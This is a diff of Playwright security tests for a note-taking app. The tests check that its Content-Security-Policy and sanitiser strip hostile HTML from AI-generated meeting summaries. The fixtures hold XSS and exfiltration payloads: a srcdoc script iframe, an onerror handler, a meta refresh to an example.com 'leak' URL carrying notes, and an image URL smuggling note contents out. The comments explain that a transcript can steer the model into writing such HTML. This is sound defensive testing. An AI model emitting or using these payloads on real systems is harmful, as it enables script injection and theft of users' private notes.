@@ -105,6 +105,15 @@ async function openApp(page: Page, commands: Record<string, unknown>) {
   await page.goto(`${APP}/`);
 }
 
+/** Requests that left for the remote test host. */
+function watchOutbound(page: Page): string[] {
+  const outbound: string[] = [];
+  page.on("request", (request) => {
+    if (request.url().startsWith("https://example.com")) outbound.push(request.url());
+  });
+  return outbound;
+}
+
 const violations = (page: Page) =>
   page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations);
 
@@ -115,12 +124,14 @@ const noteTab = (page: Page, name: string) =>
     })
     .getByRole("button", { name: new RegExp(`^${name}`, "i") });
 
+// One build per worker, shared by every test in this file.
+test.beforeAll(async ({}, testInfo) => {
+  testInfo.setTimeout(180_000);
+  execFileSync("npx", ["vite", "build", "--outDir", dist, "--emptyOutDir", "--logLevel", "error"]);
+});
+test.afterAll(() => rmSync(dist, { recursive: true, force: true }));
+
 test.describe("Content-Security-Policy", () => {
-  test.beforeAll(async ({}, testInfo) => {
-    testInfo.setTimeout(180_000);
-    execFileSync("npx", ["vite", "build", "--outDir", dist, "--emptyOutDir", "--logLevel", "error"]);
-  });
-  test.afterAll(() => rmSync(dist, { recursive: true, force: true }));
 
   test("keeps scripts to the app's own files", () => {
     expect(csp, "tauri.conf.json has a CSP").not.toBeNull();
@@ -247,17 +258,43 @@ test.describe("Content-Security-Policy", () => {
     expect(await violations(page)).toEqual([]);
   });
 
-  test("keeps an AI summary from running script or sending the notes out", async ({ page }) => {
-    // A transcript can steer the model into writing HTML, and summaries
-    // render it (rehype-raw). React drops handler attributes and doesn't run
-    // <script>, but a srcdoc frame is same-origin and runs its own scripts,
-    // with the page's access to every command. The policy applies inside it.
-    // And a remote image is enough to send the meeting to someone else's
-    // server: plain markdown, the model only has to be told to write it.
-    const outbound: string[] = [];
-    page.on("request", (request) => {
-      if (request.url().startsWith("https://example.com")) outbound.push(request.url());
+  test("stops script and requests out of HTML that gets into the page", async ({ page }) => {
+    // The policy on its own, whatever way HTML got in: a srcdoc frame is
+    // same-origin and runs its own scripts, with the page's access to every
+    // command, and a remote image can carry the notes in its URL.
+    const note = makeNote({ id: "n1", title: "Vendor call" });
+    await openApp(page, { list_notes: [note], get_note: note });
+    const outbound = watchOutbound(page);
+    await page.getByRole("button", { name: /vendor call/i }).first().click();
+
+    await page.evaluate(() => {
+      const frame = document.createElement("iframe");
+      frame.srcdoc = "<script>parent.__pwned = 'srcdoc'</script>";
+      const image = document.createElement("img");
+      image.src = "https://example.com/chart.png?notes=pricing+is+%2412";
+      document.body.append(frame, image);
     });
+    await page.waitForFunction(() => {
+      const frame = document.querySelector("body > iframe") as HTMLIFrameElement | null;
+      return frame?.contentDocument?.readyState === "complete";
+    });
+    await page.waitForTimeout(300);
+
+    expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined();
+    expect(await violations(page)).toContain(
+      "img-src refused https://example.com/chart.png?notes=pricing+is+%2412"
+    );
+    expect(outbound).toEqual([]);
+  });
+});
+
+test.describe("AI summary HTML", () => {
+
+  test("renders without the parts that could act on their own", async ({ page }) => {
+    // A transcript can steer the model, and summaries render the HTML it
+    // writes. What could act is removed before it renders (rehype-sanitize);
+    // a remote image is left to the policy, and a <meta refresh> would have
+    // sent the window, notes in the URL, to another site.
     const note = makeNote({ id: "n1", title: "Vendor call" });
     await openApp(page, {
       list_notes: [note],
@@ -270,9 +307,14 @@ test.describe("Content-Security-Policy", () => {
           content: [
             "## Summary",
             "",
+            `<meta http-equiv="refresh" content="0;url=https://example.com/leak?notes=secret">`,
             `<iframe srcdoc="<script>parent.__pwned = 'srcdoc'</script>"></iframe>`,
-            "",
             `<img src="missing.png" onerror="window.__pwned = 'onerror'">`,
+            "<style>main { display: none }</style>",
+            "",
+            "| Owner | Task |",
+            "| --- | --- |",
+            "| Sofia | Pricing deck<br>by Friday |",
             "",
             "![chart](https://example.com/chart.png?notes=pricing+is+%2412)",
           ].join("\n"),
@@ -280,13 +322,16 @@ test.describe("Content-Security-Policy", () => {
         },
       ],
     });
+    const outbound = watchOutbound(page);
     await page.getByRole("button", { name: /vendor call/i }).first().click();
 
-    await page.waitForFunction(() => {
-      const frame = document.querySelector("main iframe") as HTMLIFrameElement | null;
-      return frame?.contentDocument?.readyState === "complete";
-    });
-    await page.waitForTimeout(300);
+    await expect(page.getByText("by Friday")).toBeVisible();
+    await page.waitForTimeout(1500);
+    await expect(page.locator("main td br")).toHaveCount(1);
+    for (const tag of ["iframe", "meta", "style"]) {
+      await expect(page.locator(`main ${tag}`), tag).toHaveCount(0);
+    }
+    expect(page.url()).toBe(`${APP}/`);
     expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined();
     expect(await violations(page)).toContain(
       "img-src refused https://example.com/chart.png?notes=pricing+is+%2412"
